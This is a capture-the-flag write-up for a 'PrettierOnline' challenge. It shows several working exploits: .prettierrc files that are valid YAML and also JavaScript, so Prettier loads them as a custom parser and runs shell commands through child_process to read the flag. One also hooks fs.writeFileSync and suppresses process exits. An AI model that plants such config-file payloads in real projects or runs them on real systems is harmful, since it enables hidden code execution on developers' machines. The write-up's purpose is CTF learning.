# PrettierOnline

A easy challenge, lots of teams solved this. BTW, some teams tried ChatGPT. Fortunately, AI can't solve this.

## My solution
```js
#!/usr/bin/node
filepath:
  // .prettierrc accepts JSON and YAML
  // YAML xxx: syntax is label statement in JavaScript
  var pp = require('./node_modules/prettier/parser-espree.js').parsers.espree.parse;
  var fs = require('fs');
  var oldWFS = fs.writeFileSync
  // Bypass `process.exit()`
  process.reallyExit = () => {}
  // Bypass `throw new Exception`
  process.on('uncaughtException', () => {})
  module.exports = function(code,...a) {
    fs.writeFileSync = function(file, data, options) {
      if (/ret.js/.test(file)) {
        // Dynamic import statement cannot be hooked
        // All processes of Prettier are synchronous operations, dynamic import is an asynchronous operation and cannot be accessed inside Prettier.
        // Therefore we can only process from the output data after the execution of Prettier is finished.
        import('child_process').then(cp => {
          const ret = cp.execSync('/readflag').toString('utf-8')
          oldWFS.call(oldWFS, file, ret, options)
        })
      } else {
        return oldWFS.apply(oldWFS, arguments)
      }
    }
    return pp.call(pp,code,...a)
  }
# Prettier will require custom parser here
parser: './.prettierrc'
trailingComma: 'es5'
tabWidth: 4
semi: false
singleQuote: true

```

## Other interesting solutions

```js
parser: ".prettierrc"
a: /*
# */ ;module.exports = () => ({"type":"File","program":{"type":"Program","body":[],"directives":[{"type":"Directive","value":{"type":"DirectiveLiteral","extra":{"raw":JSON.stringify(module.constructor._load('child_process').execSync('/readflag').toString())}}}]}});

// This is require('module')._load
```

```js
parser: ".prettierrc"
foo: module.exports=_=>module.constructor._load('child_process').execSync('cat ./flag').toString()
```

```js
{
  parser: ".prettierrc",
  /x|x/.__proto__.test=()=>true,
  module.exports=()=>require("child_process").execSync("pwd;cat flag").toString()
}
// Hook RegExp.prototype.test
```
